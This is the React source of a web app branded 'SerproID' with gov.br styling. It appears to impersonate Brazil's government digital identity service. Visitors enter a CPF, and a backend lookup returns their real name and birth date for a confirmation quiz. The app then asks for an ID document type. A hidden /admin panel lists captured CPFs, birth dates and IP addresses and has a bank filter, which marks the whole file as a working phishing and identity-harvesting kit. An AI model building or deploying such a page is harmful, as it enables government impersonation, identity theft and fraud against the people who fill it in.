import { useEffect, useMemo, useState } from "react";
import "./App.css";
import { formatCpf, isValidCpf } from "./utils/cpf";

const TOTAL_STEPS = 5;
const SUPABASE_URL = "https://eehunmzyjaxqgmiwgwqx.supabase.co";
const SUPABASE_PUBLISHABLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVlaHVubXp5amF4cWdtaXdnd3F4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODkxMTUyMDcsImV4cCI6MjEwNDY5MTIwN30.akbq0AMrYYN6JffftguhO7MRk4CASlILv3gru4SJGu4";
const ADMIN_SESSION_KEY = "serproid-admin-session";

async function signInAdmin(email, password) {
  const response = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
    method: "POST",
    headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY },
    body: JSON.stringify({ email, password }),
  });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(payload.error_description || "Email ou senha inválidos.");
  const userResponse = await fetch(`${SUPABASE_URL}/auth/v1/user`, { headers: { apikey: SUPABASE_PUBLISHABLE_KEY, Authorization: `Bearer ${payload.access_token}` } });
  const user = await userResponse.json().catch(() => ({}));
  const role = user?.app_metadata?.role || user?.user_metadata?.role;
  if (role !== "admin") throw new Error("Este usuário não possui permissão de administrador.");
  sessionStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify({ access_token: payload.access_token, refresh_token: payload.refresh_token, expires_at: payload.expires_at }));
}

function hasAdminSession() {
  try { return Boolean(JSON.parse(sessionStorage.getItem(ADMIN_SESSION_KEY) || "null")?.access_token); } catch { return false; }
}

function Header({ step }) {
  return <header className="brand-area"><div className="brand-mark">SerproID</div><div className="progress" role="progressbar" aria-valuenow={step} aria-valuemin="1" aria-valuemax={TOTAL_STEPS}><div className="progress__track">{Array.from({ length: TOTAL_STEPS }, (_, index) => <span key={index} className={index < step ? "progress__segment is-active" : "progress__segment"} />)}</div><p>Etapa <strong>{step}</strong> de {TOTAL_STEPS}</p></div></header>;
}
function Footer() { return <footer className="footer-brand" aria-label="Governo Federal"><span className="gov-blue">gov</span><span className="gov-green">.</span><span className="gov-yellow">br</span></footer>; }

function Step1({ cpf, setCpf, onContinue }) {
  const [touched, setTouched] = useState(false); const [loading, setLoading] = useState(false); const [lookupError, setLookupError] = useState("");
  const digits = cpf.replace(/\D/g, ""); const valid = digits.length === 11 && isValidCpf(cpf); const error = touched && digits.length === 11 && !valid;
  function submit(event) { event.preventDefault(); setTouched(true); setLookupError(""); if (!valid || loading) return; setLoading(true); fetch(`${SUPABASE_URL}/functions/v1/consultar-cpf`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY, Authorization: `Bearer ${SUPABASE_PUBLISHABLE_KEY}` }, body: JSON.stringify({ cpf: digits }) }).then(async (response) => { const payload = await response.json().catch(() => ({})); if (!response.ok) throw new Error(payload.error || "Não foi possível consultar o CPF agora"); onContinue(payload.data || null); }).catch((lookupError) => setLookupError(lookupError.message)).finally(() => setLoading(false)); }
  return <form className="step-panel" onSubmit={submit} noValidate><div className="eyebrow">IDENTIDADE DIGITAL</div><h1>Seja bem-vindo(a)</h1><p className="subtitle">Para iniciar sua validação de identidade, digite seu CPF abaixo</p><label className="sr-only" htmlFor="cpf">CPF</label><input id="cpf" name="cpf" autoFocus inputMode="numeric" autoComplete="off" className={error ? "input input--error" : "input"} placeholder="000.000.000-00" value={cpf} maxLength={14} onChange={(event) => setCpf(formatCpf(event.target.value))} onBlur={() => setTouched(true)} />{error && <p className="error-message">CPF inválido. Confira os números digitados.</p>}{lookupError && <p className="error-message">{lookupError}</p>}<button className="primary-button" type="submit" disabled={digits.length !== 11 || loading}>{loading ? <><span className="spinner" /> Consultando...</> : "Continuar"}</button><p className="privacy"><span className="lock">⌕</span> Seus dados são protegidos e utilizados apenas para validação de identidade</p></form>;
}
function Step2({ cpf, identity, onContinue, onBack }) {
  const masked = useMemo(() => `${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)}`, [cpf]);
  const realName = identity?.name || identity?.nameUpper || "Nome não disponível";
  const choices = useMemo(() => [realName, "Mariana Oliveira Santos", "Rafael Almeida Ferreira"], [realName]);
  const [selectedName, setSelectedName] = useState("");
  const [error, setError] = useState("");
  function confirm() { if (!selectedName) { setError("Selecione uma opção para continuar."); return; } if (selectedName !== realName) { setError("Nome incorreto. Confira seus dados e tente novamente."); return; } onContinue(); }
  return <section className="step-panel"><div className="illustration"><span>✓</span></div><h1>Qual é o seu nome completo?</h1><p className="subtitle">Para confirmar sua identidade, selecione seu nome entre as opções abaixo.</p><div className="summary-card"><span>CPF</span><strong>{masked}</strong><span className="verified">✓ consultado</span></div><div className="name-choices" role="radiogroup" aria-label="Selecione seu nome">{choices.map((name) => <button key={name} type="button" className={selectedName === name ? "name-choice is-selected" : "name-choice"} onClick={() => { setSelectedName(name); setError(""); }}><span className="radio">{selectedName === name ? "✓" : ""}</span>{name}</button>)}</div>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirm}>Confirmar e continuar</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button><p className="privacy">Seus dados são usados somente para validação de identidade</p></section>;
}
function StepBirthDate({ identity, onContinue, onBack }) {
  const realDate = identity?.birthDate || [identity?.day, identity?.month, identity?.year].filter(Boolean).join("/") || "15/06/1990";
  const choices = useMemo(() => [realDate, "25/04/1996", "07/12/2004"], [realDate]);
  const [selectedDate, setSelectedDate] = useState("");
  const [error, setError] = useState("");
  function confirm() { if (!selectedDate) { setError("Selecione uma data para continuar."); return; } if (selectedDate !== realDate) { setError("Data incorreta. Confira seus dados e tente novamente."); return; } onContinue(); }
  return <section className="step-panel"><div className="illustration"><span>◷</span></div><div className="confirmed-label">✓ Nome confirmado</div><h1>Confirme seus dados</h1><p className="subtitle">Para sua segurança, selecione as opções corretas</p><div className="confirmed-label">✓ CPF encontrado</div><h2 className="question-title">Qual é a sua data de nascimento?</h2><div className="name-choices date-choices" role="radiogroup" aria-label="Selecione sua data de nascimento">{choices.map((date) => <button key={date} type="button" className={selectedDate === date ? "name-choice is-selected" : "name-choice"} onClick={() => { setSelectedDate(date); setError(""); }}><span className="radio">{selectedDate === date ? "✓" : ""}</span>{date}</button>)}</div>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirm}>Confirmar data</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;
}
function Step3({ onContinue, onBack }) { const [selected, setSelected] = useState(""); return <section className="step-panel"><div className="illustration"><span>▤</span></div><h1>Envie um documento</h1><p className="subtitle">Escolha um documento oficial com foto para confirmar sua identidade.</p><div className="document-options" role="radiogroup" aria-label="Tipo de documento">{["Carteira de identidade (RG)", "Carteira de motorista (CNH)"].map((item) => <button key={item} type="button" className={selected === item ? "document-option is-selected" : "document-option"} onClick={() => setSelected(item)}><span className="radio">{selected === item ? "✓" : ""}</span>{item}</button>)}</div><div className="upload-note"><span>↥</span><div><strong>Foto nítida e bem iluminada</strong><small>Você poderá enviar a imagem na próxima tela</small></div></div><button className="primary-button" type="button" disabled={!selected} onClick={onContinue}>Continuar</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>; }
function Step4({ onRestart }) { return <section className="step-panel complete-panel"><div className="success-icon">✓</div><h1>Validação iniciada!</h1><p className="subtitle">Recebemos suas informações. Em breve você receberá o resultado da sua validação de identidade.</p><div className="status-card"><span className="status-dot" /> Processo em análise</div><button className="primary-button" type="button" onClick={onRestart}>Voltar ao início</button><p className="privacy">Não feche esta página até concluir o processo.</p></section>; }

const adminRows = [
  { cpf: "***.436.281-30", name: "Cadastro demonstrativo", birth: "21/05/1999", ip: "177.202.xxx.xxx", date: "Hoje, 11:23", status: "Pendente", stage: "Completo" },
  { cpf: "***.222.841-20", name: "Usuário verificado", birth: "30/11/1979", ip: "45.6.xxx.xxx", date: "Hoje, 11:05", status: "Pendente", stage: "Completo" },
  { cpf: "***.716.216-48", name: "Cadastro demonstrativo", birth: "13/06/1999", ip: "164.163.xxx.xxx", date: "Hoje, 10:51", status: "Pendente", stage: "Em análise" },
  { cpf: "***.847.923-96", name: "Usuário verificado", birth: "19/11/1988", ip: "45.226.xxx.xxx", date: "Hoje, 10:26", status: "Pendente", stage: "Completo" },
  { cpf: "***.288.176-54", name: "Cadastro demonstrativo", birth: "01/11/1989", ip: "201.54.xxx.xxx", date: "Hoje, 10:13", status: "Pendente", stage: "Completo" },
];

function AdminLogin({ onLogin }) {
  const [email, setEmail] = useState(""); const [password, setPassword] = useState(""); const [error, setError] = useState(""); const [loading, setLoading] = useState(false);
  async function submit(event) { event.preventDefault(); if (!email || !password) { setError("Informe seu email e sua senha."); return; } setError(""); setLoading(true); try { await signInAdmin(email, password); onLogin(); } catch (loginError) { setError(loginError.message); } finally { setLoading(false); } }
  return <main className="admin-shell admin-login-shell"><form className="admin-login-card" onSubmit={submit}><div className="admin-lock">⌑</div><h1>Painel Administrativo</h1><p>Faça login para acessar o painel de gerenciamento</p><label htmlFor="admin-email">Email</label><input id="admin-email" type="email" placeholder="admin@exemplo.com" value={email} onChange={(event) => setEmail(event.target.value)} autoComplete="username" /><label htmlFor="admin-password">Senha</label><input id="admin-password" type="password" placeholder="••••••••" value={password} onChange={(event) => setPassword(event.target.value)} autoComplete="current-password" />{error && <small className="admin-error">{error}</small>}<button className="admin-submit" type="submit" disabled={loading}>{loading ? "Entrando..." : "Entrar"}</button></form></main>;
}
function AdminDashboard({ onLogout }) {
  const [query, setQuery] = useState(""); const [status, setStatus] = useState({});
  const rows = adminRows.filter((row) => `${row.cpf} ${row.name} ${row.ip}`.toLowerCase().includes(query.toLowerCase())).map((row, index) => ({ ...row, status: status[index] || row.status }));
  function updateRow(index, next) { setStatus((current) => ({ ...current, [index]: next })); }
  return <main className="admin-shell"><header className="admin-topbar"><strong>SerproID</strong><button type="button" onClick={onLogout}>Sair</button></header><div className="admin-content"><div className="admin-heading"><div><span className="admin-kicker">GESTÃO DE IDENTIDADE</span><h1>Painel Administrativo</h1></div><span className="admin-live"><i /> Sistema online</span></div><section className="stats-grid"><div><span>Total de Cadastros</span><strong>9.992</strong><small>↗ 12% este mês</small></div><div><span>Últimas 24 horas</span><strong>118</strong><small>Novos cadastros</small></div><div><span>Validados</span><strong className="green-number">4</strong><small>Processos concluídos</small></div></section><section className="records-card"><div className="records-head"><div><h2>Cadastros</h2><p>Gerencie as solicitações de validação</p></div><input type="search" placeholder="Buscar por nome, CPF ou IP..." value={query} onChange={(event) => setQuery(event.target.value)} /></div><div className="filter-row"><button type="button">Todos os status⌄</button><button type="button">Todas as etapas⌄</button><button type="button">Todos os bancos⌄</button><button type="button">Todo o período⌄</button></div><div className="table-wrap"><table><thead><tr><th>CPF</th><th>Nome</th><th>Nascimento</th><th>IP</th><th>Data/Hora</th><th>Status</th><th>Ações</th></tr></thead><tbody>{rows.map((row, index) => <tr key={row.cpf}><td>{row.cpf}</td><td><strong>{row.name}</strong><span className="stage-badge">{row.stage}</span></td><td>{row.birth}</td><td className="ip-cell">{row.ip}</td><td>{row.date}</td><td><span className={`status-badge status-${row.status.toLowerCase()}`}>{row.status}</span></td><td className="actions"><button type="button" onClick={() => updateRow(index, "Aprovado")}>✓ Aprovar</button><button type="button" onClick={() => updateRow(index, "Rejeitado")}>× Rejeitar</button></td></tr>)}</tbody></table></div><div className="pagination"><span>{rows.length} registros exibidos</span><span>Página 1 de 1000 <button type="button">Próxima →</button></span></div></section></div></main>;
}

export default function App() {
  const [route] = useState(window.location.pathname); const [step, setStep] = useState(1); const [cpf, setCpf] = useState(""); const [identity, setIdentity] = useState(null); const [adminLogged, setAdminLogged] = useState(hasAdminSession);
  useEffect(() => { document.title = route.startsWith("/admin") ? "SerproID — Painel Administrativo" : "SerproID — Identidade digital segura"; }, [route]);
  if (route.startsWith("/admin")) { if (!adminLogged) return <AdminLogin onLogin={() => setAdminLogged(true)} />; return <AdminDashboard onLogout={() => { sessionStorage.removeItem(ADMIN_SESSION_KEY); setAdminLogged(false); }} />; }
  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <Step3 onContinue={() => setStep(5)} onBack={() => setStep(3)} />}{step === 5 && <Step4 onRestart={() => { setStep(1); setCpf(""); setIdentity(null); }} />}</div><Footer /></div></main>;
}
